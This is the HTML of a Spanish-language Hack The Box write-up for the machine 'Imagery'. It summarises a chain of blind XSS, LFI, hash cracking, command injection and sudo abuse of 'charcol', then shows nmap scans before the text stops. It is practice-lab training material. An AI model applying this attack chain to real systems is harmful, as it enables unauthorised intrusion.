<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Imagery - Hack The Box" />
<meta property="og:locale" content="en" />
<meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<link rel="canonical" href="http://localhost:4000/posts/imagery/" />
<meta property="og:url" content="http://localhost:4000/posts/imagery/" />
<meta property="og:site_name" content="MrIncreibl3" />
<meta property="og:image" content="http://localhost:4000/assets/img/htb-writeup-imagery/imagery.png" />
<meta property="og:image:alt" content="imagery" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-10-24T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/htb-writeup-imagery/imagery.png" />
<meta name="twitter:image:alt" content="imagery" />
<meta property="twitter:title" content="Imagery - Hack The Box" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-10-24T00:00:00+00:00","datePublished":"2025-10-24T00:00:00+00:00","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Imagery - Hack The Box","image":{"alt":"imagery","url":"http://localhost:4000/assets/img/htb-writeup-imagery/imagery.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/imagery/"},"url":"http://localhost:4000/posts/imagery/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Imagery - Hack The Box | MrIncreibl3
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="MrIncreibl3">
<meta name="application-name" content="MrIncreibl3">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/logo.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">MrIncreibl3</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Pentester , CTF player  HackTheBox RedTeam</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/MrIncreible3"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['',''].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Imagery - Hack The Box</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Imagery - Hack The Box</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761264000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct 24, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/htb-writeup-imagery/imagery.png" class="popup img-link preview-img shimmer"><img src="/assets/img/htb-writeup-imagery/imagery.png"  alt="imagery" width="1200" height="630"  loading="lazy"></a><figcaption class="text-center pt-2 pb-2">imagery</figcaption></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4610 words"
>
  <em>25 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p><a href="/assets/img/htb-writeup-imagery/imagery-logo.png" class="popup img-link right shimmer"><img src="/assets/img/htb-writeup-imagery/imagery-logo.png" alt="logo"  width="200" height="200" loading="lazy"></a></p>

<p>Imagery es una maquina de dificultad Media que al principio del escaneo nos encontramos con una web desarrollada en el lenguaje python werkzeug. Al principio parece una web normal y simple de subida de archivos (imagenes) pero luego nos encontramos con un apartado donde se podian subir reportes de bugs, en esta seccion cargamos un payload en <code class="language-plaintext highlighter-rouge">XSS</code> que lo derivamos a un <code class="language-plaintext highlighter-rouge">Blind XSS to Admin Account</code>, dentro del panel del usuario Admin nos encontramos con un boton que nos permitia descargar un archivo que contenia <code class="language-plaintext highlighter-rouge">logs</code>, aprovechamos a interceptar y ver el endpoint con <code class="language-plaintext highlighter-rouge">Burp</code> y asi descubriendo un <code class="language-plaintext highlighter-rouge">LFI</code>. Enumerando archivos internos de la maquina observamos un <code class="language-plaintext highlighter-rouge">db.json</code> que en su contenido se ubicaban los hashes md5 del usuario <code class="language-plaintext highlighter-rouge">testuser</code> y <code class="language-plaintext highlighter-rouge">admin</code>, logramos crackear el hash de testuser y nos logueamos como dicho usuario, dentro de este panel nos encontramos con mas funciones que nos permitieron ejecutar comandos en el sistema mediante un <code class="language-plaintext highlighter-rouge">Command Injection</code> en uno de los parametros de la funcion <code class="language-plaintext highlighter-rouge">Transform Image</code>. Una vez conseguida la shell enumerando obtuvimos un archivo con extension <code class="language-plaintext highlighter-rouge">zip.aes</code> que logramos descifrar con <code class="language-plaintext highlighter-rouge">PyAesCrypt</code>, en su contenido ubicamos otro <code class="language-plaintext highlighter-rouge">db.json</code> con hashes de los usuarios <code class="language-plaintext highlighter-rouge">mark</code> y <code class="language-plaintext highlighter-rouge">web</code>, tambien logramos crackear el hash de mark y pasando del usuario web a mark. Una vez conseguida la shell como <code class="language-plaintext highlighter-rouge">mark</code> este podia ejecutar como SUDO una herramienta llamada <code class="language-plaintext highlighter-rouge">charcol</code>, investigamos como ejecutar comandos con esta herramienta y logramos escalar al usuario ROOT.</p>

<h2 id="reconocimiento"><span class="me-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="nmap"><span class="me-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Empezamos la maquina con un escaneo basico con nmap pasandole el <code class="language-plaintext highlighter-rouge">-p-</code> para escanear todo el rango de puertos, <code class="language-plaintext highlighter-rouge">--open</code> este parametro nos va mostrar solo los puertos abiertos, <code class="language-plaintext highlighter-rouge">-n</code> <code class="language-plaintext highlighter-rouge">-Pn</code> sin resolucion DNS y descubrimiento de HOSTS, <code class="language-plaintext highlighter-rouge">-vvv</code> para que nos muestre por consola los puertos que se encuentran abiertos mientras realiza el escaneo</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T4</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.88
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-10-24 14:24 CEST
Initiating SYN Stealth Scan at 14:24
Scanning 10.10.11.88 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.11.88
SYN Stealth Scan Timing: About 39.33% <span class="k">done</span><span class="p">;</span> ETC: 14:26 <span class="o">(</span>0:00:48 remaining<span class="o">)</span>
Discovered open port 8000/tcp on 10.10.11.88
Completed SYN Stealth Scan at 14:27, 126.07s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.88
Host is up, received user-set <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2025-10-24 14:24:58 CEST <span class="k">for </span>126s
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>126.15 seconds
           Raw packets sent: 105226 <span class="o">(</span>4.630MB<span class="o">)</span> | Rcvd: 102796 <span class="o">(</span>4.112MB<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Puerto 22
    <ul>
      <li>SSH</li>
    </ul>
  </li>
  <li>Puerto 8000
    <ul>
      <li>HTTP</li>
    </ul>
  </li>
</ul>

<h3 id="nmap-servicios-de-puertos"><span class="me-2">Nmap Servicios de Puertos</span><a href="#nmap-servicios-de-puertos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Una vez detectado los puertos abiertos, iniciamos con la deteccion de los servicios que corren en el puerto <code class="language-plaintext highlighter-rouge">22</code> y <code class="language-plaintext highlighter-rouge">8000</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p22</span>,8000 <span class="nt">-sCV</span> 10.10.11.88
Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-10-24 15:20 CEST
Nmap scan report <span class="k">for </span>10.10.11.88
Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa <span class="o">(</span>ED25519<span class="o">)</span>
8000/tcp open http
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

